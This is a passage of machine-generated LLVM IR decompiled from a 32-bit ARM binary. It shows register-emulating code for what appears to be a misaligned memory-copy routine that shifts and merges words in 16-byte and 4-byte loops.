  %v1_1751c = add i32 %v0_17524, -12
  %v3_1751c = sub i32 11, %v0_17524
  %v4_1751c = and i32 %v3_1751c, %v0_17524
  %v5_1751c = icmp slt i32 %v4_1751c, 0
  store i1 %v5_1751c, i1* %cpsr_v.global-to-local, align 1
  %v6_1751c = icmp slt i32 %v1_1751c, 0
  store i1 %v6_1751c, i1* %cpsr_n.global-to-local, align 1
  %v7_1751c = icmp eq i32 %v0_17524, 12
  store i1 %v7_1751c, i1* %cpsr_z.global-to-local, align 1
  %v2_17520 = xor i1 %v6_1751c, %v5_1751c
  switch i2 %v0_174a4.off0, label %dec_label_pc_174b0 [
    i2 -1, label %dec_label_pc_17588
    i2 -2, label %dec_label_pc_1751c
  ]

dec_label_pc_174b0:                               ; preds = %dec_label_pc_1749c
  br i1 %v2_17520, label %dec_label_pc_174fc, label %dec_label_pc_174b8

dec_label_pc_174b8:                               ; preds = %dec_label_pc_174b0
  store i32 %v1_1751c, i32* %r2.global-to-local, align 4
  %v3_174bc = load i32, i32* @r4, align 4
  store i32 %v3_174bc, i32* %stack_var_-16, align 4
  %v6_174bc = load i32, i32* @r5, align 4
  store i32 %v6_174bc, i32* %stack_var_-12, align 4
  br label %dec_label_pc_174c0

dec_label_pc_174c0:                               ; preds = %dec_label_pc_174c0.dec_label_pc_174c0_crit_edge, %dec_label_pc_174b8
  %v0_174e4 = phi i32 [ %v12_174e4, %dec_label_pc_174c0.dec_label_pc_174c0_crit_edge ], [ %v0_175bc76, %dec_label_pc_174b8 ]
  %v0_174c4 = phi i32 [ %v0_174c4.pre, %dec_label_pc_174c0.dec_label_pc_174c0_crit_edge ], [ %v4_174a0, %dec_label_pc_174b8 ]
  %v0_174c0 = phi i32 [ %v0_174c0.pre, %dec_label_pc_174c0.dec_label_pc_174c0_crit_edge ], [ %v2_174a0, %dec_label_pc_174b8 ]
  %v3_174c0 = udiv i32 %v0_174c0, 256
  %v1_174c4 = inttoptr i32 %v0_174c4 to i32*
  %v2_174c4 = load i32, i32* %v1_174c4, align 4
  store i32 %v2_174c4, i32* %r4.global-to-local, align 4
  %v3_174c4 = add i32 %v0_174c4, 4
  %v4_174c4 = inttoptr i32 %v3_174c4 to i32*
  %v5_174c4 = load i32, i32* %v4_174c4, align 4
  store i32 %v5_174c4, i32* %r5.global-to-local, align 4
  %v6_174c4 = add i32 %v0_174c4, 8
  %v7_174c4 = inttoptr i32 %v6_174c4 to i32*
  %v8_174c4 = load i32, i32* %v7_174c4, align 4
  store i32 %v8_174c4, i32* %ip.global-to-local, align 4
  %v9_174c4 = add i32 %v0_174c4, 12
  %v10_174c4 = inttoptr i32 %v9_174c4 to i32*
  %v11_174c4 = load i32, i32* %v10_174c4, align 4
  store i32 %v11_174c4, i32* %lr.global-to-local, align 4
  %v12_174c4 = add i32 %v0_174c4, 16
  store i32 %v12_174c4, i32* %r1.global-to-local, align 4
  %v4_174c8 = mul i32 %v2_174c4, 16777216
  %v5_174c8 = or i32 %v4_174c8, %v3_174c0
  store i32 %v5_174c8, i32* @r3, align 4
  %v3_174cc = udiv i32 %v2_174c4, 256
  %v4_174d0 = mul i32 %v5_174c4, 16777216
  %v5_174d0 = or i32 %v4_174d0, %v3_174cc
  store i32 %v5_174d0, i32* %r4.global-to-local, align 4
  %v3_174d4 = udiv i32 %v5_174c4, 256
  %v4_174d8 = mul i32 %v8_174c4, 16777216
  %v5_174d8 = or i32 %v4_174d8, %v3_174d4
  store i32 %v5_174d8, i32* %r5.global-to-local, align 4
  %v3_174dc = udiv i32 %v8_174c4, 256
  %v4_174e0 = mul i32 %v11_174c4, 16777216
  %v5_174e0 = or i32 %v4_174e0, %v3_174dc
  store i32 %v5_174e0, i32* @ip, align 4
  %v1_174e4 = inttoptr i32 %v0_174e4 to i32*
  store i32 %v5_174c8, i32* %v1_174e4, align 4
  %v3_174e4 = add i32 %v0_174e4, 4
  %v4_174e4 = inttoptr i32 %v3_174e4 to i32*
  %v5_174e4 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_174e4, i32* %v4_174e4, align 4
  %v6_174e4 = add i32 %v0_174e4, 8
  %v7_174e4 = inttoptr i32 %v6_174e4 to i32*
  %v8_174e4 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_174e4, i32* %v7_174e4, align 4
  %v9_174e4 = add i32 %v0_174e4, 12
  %v10_174e4 = inttoptr i32 %v9_174e4 to i32*
  %v11_174e4 = load i32, i32* @ip, align 4
  store i32 %v11_174e4, i32* %v10_174e4, align 4
  %v12_174e4 = add i32 %v0_174e4, 16
  store i32 %v12_174e4, i32* @r0, align 4
  %v0_174e8 = load i32, i32* %r2.global-to-local, align 4
  %v1_174e8 = add i32 %v0_174e8, -16
  store i32 %v1_174e8, i32* %r2.global-to-local, align 4
  %v3_174e8 = sub i32 15, %v0_174e8
  %v4_174e8 = and i32 %v3_174e8, %v0_174e8
  %v5_174e8 = icmp slt i32 %v4_174e8, 0
  %v6_174e8 = icmp slt i32 %v1_174e8, 0
  %v2_174ec = xor i1 %v6_174e8, %v5_174e8
  br i1 %v2_174ec, label %dec_label_pc_174f0, label %dec_label_pc_174c0.dec_label_pc_174c0_crit_edge

dec_label_pc_174c0.dec_label_pc_174c0_crit_edge:  ; preds = %dec_label_pc_174c0
  %v0_174c0.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_174c4.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_174c0

dec_label_pc_174f0:                               ; preds = %dec_label_pc_174c0
  %v2_174f0 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_174f0, i32* @r4, align 4
  %v5_174f0 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_174f0, i32* @r5, align 4
  %v1_174f4 = add i32 %v0_174e8, -4
  store i32 %v1_174f4, i32* %r2.global-to-local, align 4
  %v3_174f4 = add i32 %v0_174e8, 2147483632
  %v4_174f4 = and i32 %v1_174f4, %v3_174f4
  %v5_174f4 = icmp slt i32 %v4_174f4, 0
  store i1 %v5_174f4, i1* %cpsr_v.global-to-local, align 1
  %v6_174f4 = icmp slt i32 %v1_174f4, 0
  store i1 %v6_174f4, i1* %cpsr_n.global-to-local, align 1
  %v7_174f4 = icmp eq i32 %v1_174f4, 0
  store i1 %v7_174f4, i1* %cpsr_z.global-to-local, align 1
  %v2_174f8 = xor i1 %v6_174f4, %v5_174f4
  br i1 %v2_174f8, label %dec_label_pc_17514, label %dec_label_pc_174fc

dec_label_pc_174fc:                               ; preds = %dec_label_pc_174f0, %dec_label_pc_174b0, %dec_label_pc_174fc
  %v1_17508 = phi i32 [ %v4_17508, %dec_label_pc_174fc ], [ %v12_174e4, %dec_label_pc_174f0 ], [ %v0_175bc76, %dec_label_pc_174b0 ]
  %v0_174fc = load i32, i32* %lr.global-to-local, align 4
  %v3_174fc = udiv i32 %v0_174fc, 256
  store i32 %v3_174fc, i32* %ip.global-to-local, align 4
  %v0_17500 = load i32, i32* %r1.global-to-local, align 4
  %v1_17500 = inttoptr i32 %v0_17500 to i32*
  %v2_17500 = load i32, i32* %v1_17500, align 4
  store i32 %v2_17500, i32* %lr.global-to-local, align 4
  %v4_17500 = add i32 %v0_17500, 4
  store i32 %v4_17500, i32* %r1.global-to-local, align 4
  %v4_17504 = mul i32 %v2_17500, 16777216
  %v5_17504 = or i32 %v4_17504, %v3_174fc
  store i32 %v5_17504, i32* @ip, align 4
  %v2_17508 = inttoptr i32 %v1_17508 to i32*
  store i32 %v5_17504, i32* %v2_17508, align 4
  %v3_17508 = load i32, i32* @r0, align 4
  %v4_17508 = add i32 %v3_17508, 4
  store i32 %v4_17508, i32* @r0, align 4
  %v0_1750c = load i32, i32* %r2.global-to-local, align 4
  %v1_1750c = add i32 %v0_1750c, -4
  store i32 %v1_1750c, i32* %r2.global-to-local, align 4
  %v3_1750c = sub i32 3, %v0_1750c
  %v4_1750c = and i32 %v3_1750c, %v0_1750c
  %v5_1750c = icmp slt i32 %v4_1750c, 0
  %v6_1750c = icmp slt i32 %v1_1750c, 0
  %v2_17510 = xor i1 %v6_1750c, %v5_1750c
  br i1 %v2_17510, label %dec_label_pc_17514.loopexit, label %dec_label_pc_174fc

dec_label_pc_17514.loopexit:                      ; preds = %dec_label_pc_174fc
  %v7_1750c = icmp eq i32 %v0_1750c, 4
  store i1 %v5_1750c, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_1750c, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_1750c, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17514

dec_label_pc_17514:                               ; preds = %dec_label_pc_17514.loopexit, %dec_label_pc_174f0
  %v0_1743c59 = phi i32 [ %v1_1750c, %dec_label_pc_17514.loopexit ], [ %v1_174f4, %dec_label_pc_174f0 ]
  %v0_17514 = load i32, i32* %r1.global-to-local, align 4
  %v1_17514 = add i32 %v0_17514, -3
  store i32 %v1_17514, i32* @r1, align 4
  br label %bb140

dec_label_pc_1751c:                               ; preds = %dec_label_pc_1749c
  br i1 %v2_17520, label %dec_label_pc_17568, label %dec_label_pc_17524

dec_label_pc_17524:                               ; preds = %dec_label_pc_1751c
  store i32 %v1_1751c, i32* %r2.global-to-local, align 4
  %v3_17528 = load i32, i32* @r4, align 4
  store i32 %v3_17528, i32* %stack_var_-16, align 4
  %v6_17528 = load i32, i32* @r5, align 4
  store i32 %v6_17528, i32* %stack_var_-12, align 4
  br label %dec_label_pc_1752c

dec_label_pc_1752c:                               ; preds = %dec_label_pc_1752c.dec_label_pc_1752c_crit_edge, %dec_label_pc_17524
  %v0_17550 = phi i32 [ %v12_17550, %dec_label_pc_1752c.dec_label_pc_1752c_crit_edge ], [ %v0_175bc76, %dec_label_pc_17524 ]
  %v0_17530 = phi i32 [ %v0_17530.pre, %dec_label_pc_1752c.dec_label_pc_1752c_crit_edge ], [ %v4_174a0, %dec_label_pc_17524 ]
  %v0_1752c = phi i32 [ %v0_1752c.pre, %dec_label_pc_1752c.dec_label_pc_1752c_crit_edge ], [ %v2_174a0, %dec_label_pc_17524 ]
  %v3_1752c = udiv i32 %v0_1752c, 65536
  %v1_17530 = inttoptr i32 %v0_17530 to i32*
  %v2_17530 = load i32, i32* %v1_17530, align 4
  store i32 %v2_17530, i32* %r4.global-to-local, align 4
  %v3_17530 = add i32 %v0_17530, 4
  %v4_17530 = inttoptr i32 %v3_17530 to i32*
  %v5_17530 = load i32, i32* %v4_17530, align 4
  store i32 %v5_17530, i32* %r5.global-to-local, align 4
  %v6_17530 = add i32 %v0_17530, 8
  %v7_17530 = inttoptr i32 %v6_17530 to i32*
  %v8_17530 = load i32, i32* %v7_17530, align 4
  store i32 %v8_17530, i32* %ip.global-to-local, align 4
  %v9_17530 = add i32 %v0_17530, 12
  %v10_17530 = inttoptr i32 %v9_17530 to i32*
  %v11_17530 = load i32, i32* %v10_17530, align 4
  store i32 %v11_17530, i32* %lr.global-to-local, align 4
  %v12_17530 = add i32 %v0_17530, 16
  store i32 %v12_17530, i32* %r1.global-to-local, align 4
  %v4_17534 = mul i32 %v2_17530, 65536
  %v5_17534 = or i32 %v4_17534, %v3_1752c
  store i32 %v5_17534, i32* @r3, align 4
  %v3_17538 = udiv i32 %v2_17530, 65536
  %v4_1753c = mul i32 %v5_17530, 65536
  %v5_1753c = or i32 %v4_1753c, %v3_17538
  store i32 %v5_1753c, i32* %r4.global-to-local, align 4
  %v3_17540 = udiv i32 %v5_17530, 65536
  %v4_17544 = mul i32 %v8_17530, 65536
  %v5_17544 = or i32 %v4_17544, %v3_17540
  store i32 %v5_17544, i32* %r5.global-to-local, align 4
  %v3_17548 = udiv i32 %v8_17530, 65536
  %v4_1754c = mul i32 %v11_17530, 65536
  %v5_1754c = or i32 %v4_1754c, %v3_17548
  store i32 %v5_1754c, i32* @ip, align 4
  %v1_17550 = inttoptr i32 %v0_17550 to i32*
  store i32 %v5_17534, i32* %v1_17550, align 4
  %v3_17550 = add i32 %v0_17550, 4
  %v4_17550 = inttoptr i32 %v3_17550 to i32*
  %v5_17550 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_17550, i32* %v4_17550, align 4
  %v6_17550 = add i32 %v0_17550, 8
  %v7_17550 = inttoptr i32 %v6_17550 to i32*
  %v8_17550 = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_17550, i32* %v7_17550, align 4
  %v9_17550 = add i32 %v0_17550, 12
  %v10_17550 = inttoptr i32 %v9_17550 to i32*
  %v11_17550 = load i32, i32* @ip, align 4
  store i32 %v11_17550, i32* %v10_17550, align 4
  %v12_17550 = add i32 %v0_17550, 16
  store i32 %v12_17550, i32* @r0, align 4
  %v0_17554 = load i32, i32* %r2.global-to-local, align 4
  %v1_17554 = add i32 %v0_17554, -16
  store i32 %v1_17554, i32* %r2.global-to-local, align 4
  %v3_17554 = sub i32 15, %v0_17554
  %v4_17554 = and i32 %v3_17554, %v0_17554
  %v5_17554 = icmp slt i32 %v4_17554, 0
  %v6_17554 = icmp slt i32 %v1_17554, 0
  %v2_17558 = xor i1 %v6_17554, %v5_17554
  br i1 %v2_17558, label %dec_label_pc_1755c, label %dec_label_pc_1752c.dec_label_pc_1752c_crit_edge

dec_label_pc_1752c.dec_label_pc_1752c_crit_edge:  ; preds = %dec_label_pc_1752c
  %v0_1752c.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_17530.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_1752c

dec_label_pc_1755c:                               ; preds = %dec_label_pc_1752c
  %v2_1755c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1755c, i32* @r4, align 4
  %v5_1755c = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_1755c, i32* @r5, align 4
  %v1_17560 = add i32 %v0_17554, -4
  store i32 %v1_17560, i32* %r2.global-to-local, align 4
  %v3_17560 = add i32 %v0_17554, 2147483632
  %v4_17560 = and i32 %v1_17560, %v3_17560
  %v5_17560 = icmp slt i32 %v4_17560, 0
  store i1 %v5_17560, i1* %cpsr_v.global-to-local, align 1
  %v6_17560 = icmp slt i32 %v1_17560, 0
  store i1 %v6_17560, i1* %cpsr_n.global-to-local, align 1
  %v7_17560 = icmp eq i32 %v1_17560, 0
  store i1 %v7_17560, i1* %cpsr_z.global-to-local, align 1
  %v2_17564 = xor i1 %v6_17560, %v5_17560
  br i1 %v2_17564, label %dec_label_pc_17580, label %dec_label_pc_17568

dec_label_pc_17568:                               ; preds = %dec_label_pc_1755c, %dec_label_pc_1751c, %dec_label_pc_17568
  %v1_17574 = phi i32 [ %v4_17574, %dec_label_pc_17568 ], [ %v12_17550, %dec_label_pc_1755c ], [ %v0_175bc76, %dec_label_pc_1751c ]
  %v0_17568 = load i32, i32* %lr.global-to-local, align 4
  %v3_17568 = udiv i32 %v0_17568, 65536
  store i32 %v3_17568, i32* %ip.global-to-local, align 4
  %v0_1756c = load i32, i32* %r1.global-to-local, align 4
  %v1_1756c = inttoptr i32 %v0_1756c to i32*
  %v2_1756c = load i32, i32* %v1_1756c, align 4
  store i32 %v2_1756c, i32* %lr.global-to-local, align 4
  %v4_1756c = add i32 %v0_1756c, 4
  store i32 %v4_1756c, i32* %r1.global-to-local, align 4
  %v4_17570 = mul i32 %v2_1756c, 65536
  %v5_17570 = or i32 %v4_17570, %v3_17568
  store i32 %v5_17570, i32* @ip, align 4
  %v2_17574 = inttoptr i32 %v1_17574 to i32*
  store i32 %v5_17570, i32* %v2_17574, align 4
  %v3_17574 = load i32, i32* @r0, align 4
  %v4_17574 = add i32 %v3_17574, 4
  store i32 %v4_17574, i32* @r0, align 4
  %v0_17578 = load i32, i32* %r2.global-to-local, align 4
  %v1_17578 = add i32 %v0_17578, -4
  store i32 %v1_17578, i32* %r2.global-to-local, align 4
  %v3_17578 = sub i32 3, %v0_17578
  %v4_17578 = and i32 %v3_17578, %v0_17578
  %v5_17578 = icmp slt i32 %v4_17578, 0
  %v6_17578 = icmp slt i32 %v1_17578, 0
  %v2_1757c = xor i1 %v6_17578, %v5_17578
  br i1 %v2_1757c, label %dec_label_pc_17580.loopexit, label %dec_label_pc_17568

dec_label_pc_17580.loopexit:                      ; preds = %dec_label_pc_17568
  %v7_17578 = icmp eq i32 %v0_17578, 4
  store i1 %v5_17578, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_17578, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_17578, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_17580

dec_label_pc_17580:                               ; preds = %dec_label_pc_17580.loopexit, %dec_label_pc_1755c
  %v0_1743c60 = phi i32 [ %v1_17578, %dec_label_pc_17580.loopexit ], [ %v1_17560, %dec_label_pc_1755c ]
  %v0_17580 = load i32, i32* %r1.global-to-local, align 4
  %v1_17580 = add i32 %v0_17580, -2
  store i32 %v1_17580, i32* @r1, align 4
  br label %bb140

dec_label_pc_17588:                               ; preds = %dec_label_pc_1749c
  br i1 %v2_17520, label %dec_label_pc_175d4, label %dec_label_pc_17590

dec_label_pc_17590:                               ; preds = %dec_label_pc_17588
  store i32 %v1_1751c, i32* %r2.global-to-local, align 4
  %v3_17594 = load i32, i32* @r4, align 4
  store i32 %v3_17594, i32* %stack_var_-16, align 4
  %v6_17594 = load i32, i32* @r5, align 4
  store i32 %v6_17594, i32* %stack_var_-12, align 4
  br label %dec_label_pc_17598

dec_label_pc_17598:                               ; preds = %dec_label_pc_17598.dec_label_pc_17598_crit_edge, %dec_label_pc_17590
  %v0_175bc = phi i32 [ %v12_175bc, %dec_label_pc_17598.dec_label_pc_17598_crit_edge ], [ %v0_175bc76, %dec_label_pc_17590 ]
  %v0_1759c = phi i32 [ %v0_1759c.pre, %dec_label_pc_17598.dec_label_pc_17598_crit_edge ], [ %v4_174a0, %dec_label_pc_17590 ]
  %v0_17598 = phi i32 [ %v0_17598.pre, %dec_label_pc_17598.dec_label_pc_17598_crit_edge ], [ %v2_174a0, %dec_label_pc_17590 ]
  %v3_17598 = udiv i32 %v0_17598, 16777216
  %v1_1759c = inttoptr i32 %v0_1759c to i32*
  %v2_1759c = load i32, i32* %v1_1759c, align 4
  store i32 %v2_1759c, i32* %r4.global-to-local, align 4
  %v3_1759c = add i32 %v0_1759c, 4
  %v4_1759c = inttoptr i32 %v3_1759c to i32*
  %v5_1759c = load i32, i32* %v4_1759c, align 4
  store i32 %v5_1759c, i32* %r5.global-to-local, align 4
  %v6_1759c = add i32 %v0_1759c, 8
  %v7_1759c = inttoptr i32 %v6_1759c to i32*
  %v8_1759c = load i32, i32* %v7_1759c, align 4
  store i32 %v8_1759c, i32* %ip.global-to-local, align 4
  %v9_1759c = add i32 %v0_1759c, 12
  %v10_1759c = inttoptr i32 %v9_1759c to i32*
  %v11_1759c = load i32, i32* %v10_1759c, align 4
  store i32 %v11_1759c, i32* %lr.global-to-local, align 4
  %v12_1759c = add i32 %v0_1759c, 16
  store i32 %v12_1759c, i32* %r1.global-to-local, align 4
  %v4_175a0 = mul i32 %v2_1759c, 256
  %v5_175a0 = or i32 %v4_175a0, %v3_17598
  store i32 %v5_175a0, i32* @r3, align 4
  %v3_175a4 = udiv i32 %v2_1759c, 16777216
  %v4_175a8 = mul i32 %v5_1759c, 256
  %v5_175a8 = or i32 %v4_175a8, %v3_175a4
  store i32 %v5_175a8, i32* %r4.global-to-local, align 4
  %v3_175ac = udiv i32 %v5_1759c, 16777216
  %v4_175b0 = mul i32 %v8_1759c, 256
  %v5_175b0 = or i32 %v4_175b0, %v3_175ac
  store i32 %v5_175b0, i32* %r5.global-to-local, align 4
  %v3_175b4 = udiv i32 %v8_1759c, 16777216
  %v4_175b8 = mul i32 %v11_1759c, 256
  %v5_175b8 = or i32 %v4_175b8, %v3_175b4
  store i32 %v5_175b8, i32* @ip, align 4
  %v1_175bc = inttoptr i32 %v0_175bc to i32*
  store i32 %v5_175a0, i32* %v1_175bc, align 4
  %v3_175bc = add i32 %v0_175bc, 4
  %v4_175bc = inttoptr i32 %v3_175bc to i32*
  %v5_175bc = load i32, i32* %r4.global-to-local, align 4
  store i32 %v5_175bc, i32* %v4_175bc, align 4
  %v6_175bc = add i32 %v0_175bc, 8
  %v7_175bc = inttoptr i32 %v6_175bc to i32*
  %v8_175bc = load i32, i32* %r5.global-to-local, align 4
  store i32 %v8_175bc, i32* %v7_175bc, align 4
  %v9_175bc = add i32 %v0_175bc, 12
  %v10_175bc = inttoptr i32 %v9_175bc to i32*
  %v11_175bc = load i32, i32* @ip, align 4
  store i32 %v11_175bc, i32* %v10_175bc, align 4
  %v12_175bc = add i32 %v0_175bc, 16
  store i32 %v12_175bc, i32* @r0, align 4
  %v0_175c0 = load i32, i32* %r2.global-to-local, align 4
  %v1_175c0 = add i32 %v0_175c0, -16
  store i32 %v1_175c0, i32* %r2.global-to-local, align 4
  %v3_175c0 = sub i32 15, %v0_175c0
  %v4_175c0 = and i32 %v3_175c0, %v0_175c0
  %v5_175c0 = icmp slt i32 %v4_175c0, 0
  %v6_175c0 = icmp slt i32 %v1_175c0, 0
  %v2_175c4 = xor i1 %v6_175c0, %v5_175c0
  br i1 %v2_175c4, label %dec_label_pc_175c8, label %dec_label_pc_17598.dec_label_pc_17598_crit_edge

dec_label_pc_17598.dec_label_pc_17598_crit_edge:  ; preds = %dec_label_pc_17598
  %v0_17598.pre = load i32, i32* %lr.global-to-local, align 4
  %v0_1759c.pre = load i32, i32* %r1.global-to-local, align 4
  br label %dec_label_pc_17598

dec_label_pc_175c8:                               ; preds = %dec_label_pc_17598
  %v2_175c8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_175c8, i32* @r4, align 4
  %v5_175c8 = load i32, i32* %stack_var_-12, align 4
  store i32 %v5_175c8, i32* @r5, align 4
  %v1_175cc = add i32 %v0_175c0, -4
  store i32 %v1_175cc, i32* %r2.global-to-local, align 4
  %v3_175cc = add i32 %v0_175c0, 2147483632
  %v4_175cc = and i32 %v1_175cc, %v3_175cc
  %v5_175cc = icmp slt i32 %v4_175cc, 0
  store i1 %v5_175cc, i1* %cpsr_v.global-to-local, align 1
  %v6_175cc = icmp slt i32 %v1_175cc, 0
  store i1 %v6_175cc, i1* %cpsr_n.global-to-local, align 1
  %v7_175cc = icmp eq i32 %v1_175cc, 0
  store i1 %v7_175cc, i1* %cpsr_z.global-to-local, align 1
  %v2_175d0 = xor i1 %v6_175cc, %v5_175cc
  br i1 %v2_175d0, label %dec_label_pc_175ec, label %dec_label_pc_175d4

dec_label_pc_175d4:                               ; preds = %dec_label_pc_175c8, %dec_label_pc_17588, %dec_label_pc_175d4
  %v1_175e0 = phi i32 [ %v4_175e0, %dec_label_pc_175d4 ], [ %v12_175bc, %dec_label_pc_175c8 ], [ %v0_175bc76, %dec_label_pc_17588 ]
  %v0_175d4 = load i32, i32* %lr.global-to-local, align 4
  %v3_175d4 = udiv i32 %v0_175d4, 16777216
  store i32 %v3_175d4, i32* %ip.global-to-local, align 4
  %v0_175d8 = load i32, i32* %r1.global-to-local, align 4
  %v1_175d8 = inttoptr i32 %v0_175d8 to i32*
  %v2_175d8 = load i32, i32* %v1_175d8, align 4
  store i32 %v2_175d8, i32* %lr.global-to-local, align 4
  %v4_175d8 = add i32 %v0_175d8, 4
  store i32 %v4_175d8, i32* %r1.global-to-local, align 4
  %v4_175dc = mul i32 %v2_175d8, 256
  %v5_175dc = or i32 %v4_175dc, %v3_175d4
  store i32 %v5_175dc, i32* @ip, align 4
  %v2_175e0 = inttoptr i32 %v1_175e0 to i32*
  store i32 %v5_175dc, i32* %v2_175e0, align 4
  %v3_175e0 = load i32, i32* @r0, align 4
  %v4_175e0 = add i32 %v3_175e0, 4
  store i32 %v4_175e0, i32* @r0, align 4
  %v0_175e4 = load i32, i32* %r2.global-to-local, align 4
  %v1_175e4 = add i32 %v0_175e4, -4
  store i32 %v1_175e4, i32* %r2.global-to-local, align 4
  %v3_175e4 = sub i32 3, %v0_175e4
  %v4_175e4 = and i32 %v3_175e4, %v0_175e4
  %v5_175e4 = icmp slt i32 %v4_175e4, 0
  %v6_175e4 = icmp slt i32 %v1_175e4, 0
  %v2_175e8 = xor i1 %v6_175e4, %v5_175e4
  br i1 %v2_175e8, label %dec_label_pc_175ec.loopexit, label %dec_label_pc_175d4

dec_label_pc_175ec.loopexit:                      ; preds = %dec_label_pc_175d4
  %v7_175e4 = icmp eq i32 %v0_175e4, 4
  store i1 %v5_175e4, i1* %cpsr_v.global-to-local, align 1
  store i1 %v6_175e4, i1* %cpsr_n.global-to-local, align 1
  store i1 %v7_175e4, i1* %cpsr_z.global-to-local, align 1
  br label %dec_label_pc_175ec

dec_label_pc_175ec:                               ; preds = %dec_label_pc_175ec.loopexit, %dec_label_pc_175c8
  %v0_1743c61 = phi i32 [ %v1_175e4, %dec_label_pc_175ec.loopexit ], [ %v1_175cc, %dec_label_pc_175c8 ]
  %v0_175ec = load i32, i32* %r1.global-to-local, align 4
  %v1_175ec = add i32 %v0_175ec, -1
  store i32 %v1_175ec, i32* @r1, align 4
  br label %bb140

dec_label_pc_175f4:                               ; preds = %entry
  %v1_175f4 = load i32, i32* @r2, align 4
  %v2_175f4 = add i32 %v1_175f4, %v0_173a0
  store i32 %v2_175f4, i32* %r1.global-to-local, align 4
  %v2_175f8 = add i32 %v1_175f4, %v1_173a0
  store i32 %v2_175f8, i32* %r0.global-to-local, align 4
  %v2_175fc = add i32 %v1_175f4, -4
  store i32 %v2_175fc, i32* %r2.global-to-local, align 4
  %v4_175fc = sub i32 3, %v1_175f4
  %v5_175fc = and i32 %v4_175fc, %v1_175f4
  %v6_175fc = icmp slt i32 %v5_175fc, 0
  store i1 %v6_175fc, i1* %cpsr_v.global-to-local, align 1
  %v7_175fc = icmp slt i32 %v2_175fc, 0
  store i1 %v7_175fc, i1* %cpsr_n.global-to-local, align 1
  %v8_175fc = icmp eq i32 %v1_175f4, 4
  store i1 %v8_175fc, i1* %cpsr_z.global-to-local, align 1
  %v5_17600 = icmp slt i32 %v1_175f4, 4
  br i1 %v5_17600, label %bb150, label %dec_label_pc_17604

dec_label_pc_17604:                               ; preds = %dec_label_pc_175f4
  %v1_17604 = urem i32 %v2_175f8, 4
  store i32 %v1_17604, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_17604 = icmp eq i32 %v1_17604, 0
  store i1 %v2_17604, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_17604, label %dec_label_pc_1760c, label %dec_label_pc_176ac

dec_label_pc_1760c:                               ; preds = %dec_label_pc_17604
  %v1_1760c = urem i32 %v2_175f4, 4
  store i32 %v1_1760c, i32* @ip, align 4
  store i1 false, i1* %cpsr_n.global-to-local, align 1
  %v2_1760c = icmp eq i32 %v1_1760c, 0
  store i1 %v2_1760c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1760c, label %dec_label_pc_17614, label %dec_label_pc_176d8

dec_label_pc_17614:                               ; preds = %dec_label_pc_1760c, %dec_label_pc_176d0
  %v0_1762c37 = phi i32 [ %v2_175f8, %dec_label_pc_1760c ], [ %v0_1772020, %dec_label_pc_176d0 ]
  %v0_1762836 = phi i32 [ %v2_175f4, %dec_label_pc_1760c ], [ %v0_176d0, %dec_label_pc_176d0 ]
  %v0_17614 = phi i32 [ %v2_175fc, %dec_label_pc_1760c ], [ %v2_176c8, %dec_label_pc_176d0 ]
  %v2_17614 = add i32 %v0_17614, -8
  store i32 %v2_17614, i32* %r2.global-to-local, align 4
  %v4_17614 = sub i32 7, %v0_17614
  %v5_17614 = and i32 %v4_17614, %v0_17614
  %v6_17614 = icmp slt i32 %v5_17614, 0
  store i1 %v6_17614, i1* %cpsr_v.global-to-local, align 1
  %v7_17614 = icmp slt i32 %v2_17614, 0
  store i1 %v7_17614, i1* %cpsr_n.global-to-local, align 1
  %v8_17614 = icmp eq i32 %v0_17614, 8
  store i1 %v8_17614, i1* %cpsr_z.global-to-local, align 1
  %v5_17618 = icmp slt i32 %v0_17614, 8
  br i1 %v5_17618, label %dec_label_pc_17664, label %dec_label_pc_1761c

dec_label_pc_1761c:                               ; preds = %dec_label_pc_17614
  %v3_1761c = load i32, i32* @r4, align 4
  %v5_1761c = inttoptr i32 %v3_1761c to i8*
  store i8* %v5_1761c, i8** %stack_var_-8, align 4
  %v8_1761c = load i32, i32* @lr, align 4
  %v2_17620 = add i32 %v0_17614, -28
  store i32 %v2_17620, i32* %r2.global-to-local, align 4
  %v4_17620 = sub i32 27, %v0_17614
  %v5_17620 = and i32 %v4_17620, %v2_17614
  %v6_17620 = icmp slt i32 %v5_17620, 0
  store i1 %v6_17620, i1* %cpsr_v.global-to-local, align 1
  %v7_17620 = icmp slt i32 %v2_17620, 0
  store i1 %v7_17620, i1* %cpsr_n.global-to-local, align 1
  %v8_17620 = icmp eq i32 %v2_17614, 20
  store i1 %v8_17620, i1* %cpsr_z.global-to-local, align 1
  %v5_17624 = icmp slt i32 %v2_17614, 20
  br i1 %v5_17624, label %dec_label_pc_17640, label %dec_label_pc_17628

dec_label_pc_17628:                               ; preds = %dec_label_pc_1761c, %dec_label_pc_17628.dec_label_pc_17628_crit_edge
  %v0_1762c = phi i32 [ %v1_17634, %dec_label_pc_17628.dec_label_pc_17628_crit_edge ], [ %v0_1762c37, %dec_label_pc_1761c ]
  %v0_17628 = phi i32 [ %v0_17628.pre, %dec_label_pc_17628.dec_label_pc_17628_crit_edge ], [ %v0_1762836, %dec_label_pc_1761c ]
  %v1_17628 = add i32 %v0_17628, -4
  %v2_17628 = inttoptr i32 %v1_17628 to i32*
  %v3_17628 = load i32, i32* %v2_17628, align 4
  %v4_17628 = add i32 %v0_17628, -8
  %v5_17628 = inttoptr i32 %v4_17628 to i32*
  %v6_17628 = load i32, i32* %v5_17628, align 4
